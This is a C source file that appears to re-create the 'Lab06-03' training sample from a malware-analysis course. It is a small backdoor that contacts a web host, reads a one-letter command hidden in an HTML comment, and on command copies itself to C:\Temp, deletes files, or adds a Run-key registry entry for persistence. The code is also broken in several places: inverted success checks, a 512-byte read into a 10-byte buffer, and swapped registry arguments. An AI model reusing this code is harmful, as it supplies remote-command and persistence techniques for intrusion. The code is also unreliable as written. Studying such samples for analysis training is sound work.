#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Advapi32.lib")

internetConnection();
readFile();
nextFunct(char str, char argv[]);

int main(){
	int i = internetConnection();
	if (i){
		return 0;
	}
	else{
		int x = readFile();
		if (x){
			return 0;
		}
		else{
			char *lab = "Lab06-03.exe";
			printf("Success: Parsed command is %c", x);
			nextFunct(x, lab);
			Sleep(60000);
		}
		return 0;
	}
	return 0;
}

int internetConnection(){
	int a = InternetGetConnectedState(0, 0);
	if (a){
		printf("Success: Internet Connection\n");
		return 1;
	}
	else{
		printf("Error 1.1:No Internet\n");
		return 0;
	}
}

int readFile(){
	int *hInt = InternetOpen("Explorer 7.5/pma", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
	int *hFile = InternetOpenUrl(hInt, "http://www.practicalmalwareanalysis.com", NULL, 0, INTERNET_FLAG_EXISTING_CONNECT, 0);
	if (hFile){
		printf("Error 2.1: Fail to OpenUrl\n");
		InternetCloseHandle(hInt);
		return 0;
	}
	else{
		DWORD NumberOfBytesRead;
		char Buffer[10] = "";
		int isRead = InternetReadFile(hFile, Buffer, 512, &NumberOfBytesRead);
		if (isRead){
			printf("Error 2.2: Fail to ReadFile\n");
			InternetCloseHandle(hInt);
			InternetCloseHandle(hFile);
			return 0;
		}
		else{
			if (Buffer[0] == '<' &&
				Buffer[1] == '!' &&
				Buffer[2] == '-' &&
				Buffer[3] == '-'){
				char x = Buffer[4];
				return x;
			}
			else{
				printf("Error 2.3: Fail to get command\n");
				return 0;
			}
		}
	}
}

int nextFunct(char str, char argv[]){
	HKEY hkey;
	char filepath[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware";
	switch (str){
	case 'a':
		CreateDirectory("C:\\Temp", NULL);
		break;
	case 'b':
		CopyFile(argv, "C:\\Temp\\cc.exe", 0);
		break;
	case 'c':
		DeleteFile("C:\\Temp\\cc.exe");
		break;
	case 'd':
		//char filepath[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware";
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hkey);
		int n = RegSetValueEx(hkey, TEXT("C:\\Temp\\cc.exe"), 0, REG_SZ, (BYTE *)filepath, strlen(filepath));
		if (n != ERROR_SUCCESS){
			printf("Error 3.1: Could not set registry value\n");
		}
		break;
	case 'e':
		Sleep(100000); //sleep for 100 secs
		break;
	default:
		printf("Error 3.2: Not a valid command provided\n");
	}
	return 0;
}